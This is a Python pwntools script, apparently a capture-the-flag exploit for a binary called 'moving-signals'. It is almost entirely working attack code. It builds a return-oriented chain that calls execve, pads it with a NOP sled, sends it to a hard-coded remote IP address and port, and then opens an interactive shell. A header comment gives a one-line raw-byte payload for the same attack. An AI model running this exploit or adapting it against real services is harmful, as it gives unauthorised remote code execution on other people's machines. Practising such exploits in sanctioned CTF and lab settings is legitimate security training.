# run < <(python -c 'print("AAAAAAAA\x18\x10\x04\x00\x00\x00\x00\x00;\x00\x00\x00\x00\x00\x00\x00\x15\x10\x04\x00\x00\x00\x00\x00\x18\x10\x04\x00\x00\x00\x00\x00<\x00\x00\x00\x00\x00\x00\x00\x15\x10\x04\x00\x00\x00\x00\x00")')
from pwn import *

context.log_level = 'debug'


host = '161.97.176.150'
port = 2525

local_bin = "moving-signals"
elf = ELF(local_bin)
rop = ROP(elf)

OFFSET = 'A' * 8
POP_RAX = (rop.find_gadget(['pop rax', 'ret']))[0]
NOP = "\x90"

SYS_WRITE = 1
SYS_EXECVE = 59
SYS_EXIT = 60

START = 0x41000
SYSCALL = 0x41015
BINSH = START+592
MOV_RDI = asm('mov rdi, ' + hex(BINSH), arch='amd64')
RET = asm('ret', arch='amd64')
ADJUST_RDI_PAYLOAD = MOV_RDI + RET
NOP_SLED = NOP * 400

EXECUTE_SYSCALL = "" + p64(POP_RAX) + p64(SYS_EXECVE) + p64(SYSCALL) + p64(POP_RAX) + p64(SYS_EXIT) + p64(SYSCALL)

def do_exploit(step):
  mem_offset = 400*step
  payload = OFFSET + p64(0x7fffffffffff - mem_offset) + EXECUTE_SYSCALL
  NOP_SLED = NOP * (500 - len(payload) - len(ADJUST_RDI_PAYLOAD))
  payload = payload + NOP_SLED + ADJUST_RDI_PAYLOAD
  assert(len(payload) == 500)
  # with open('payload.txt', 'w') as p:
  #   p.write(payload + '\n')

  # conn = process(elf.path)
  conn = remote(host, port)
  conn.sendline(payload)
  try:
    conn.sendline('ls')
    conn.recv()
  except:
    conn.close()
    # do_exploit(step + 1)
  conn.interactive()

do_exploit(0)
